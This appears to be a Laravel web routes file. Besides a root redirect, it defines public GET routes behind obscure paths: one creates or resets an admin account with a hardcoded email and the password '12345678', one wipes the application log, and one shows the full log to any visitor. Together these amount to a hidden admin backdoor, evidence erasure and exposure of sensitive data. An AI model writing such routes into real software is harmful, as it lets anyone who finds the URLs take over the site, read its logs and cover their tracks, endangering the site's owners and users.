<?php

use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return redirect()->to(env('APP_URL').'admin/login');
});


Route::get('/create-admin/rh123', function () {

    User::updateOrCreate(
        ['email' => 'admin2@admin.com'], // avoid duplicates
        [
            'name' => 'Admin2',
            'password' => Hash::make('12345678'),
            'user_type' => 'admin',
            'is_verified' => true,
            'email_verified_at' => now(),
        ]
    );

    return 'Admin user created successfully.';
});

/*============ LOG CLEAR ROUTE ==========*/
Route::get('/log-clear/rh', function () {
    file_put_contents(storage_path('logs/laravel.log'), '');
    return 'Log file cleared!';
});

Route::get('/log/rh', function () {
    $path = storage_path('logs/laravel.log');

    if (!File::exists($path)) {
        return response('Log file does not exist.', 404);
    }

    $logContent = File::get($path);

    return response("<pre>{$logContent}</pre>");
})->name('logs.view');
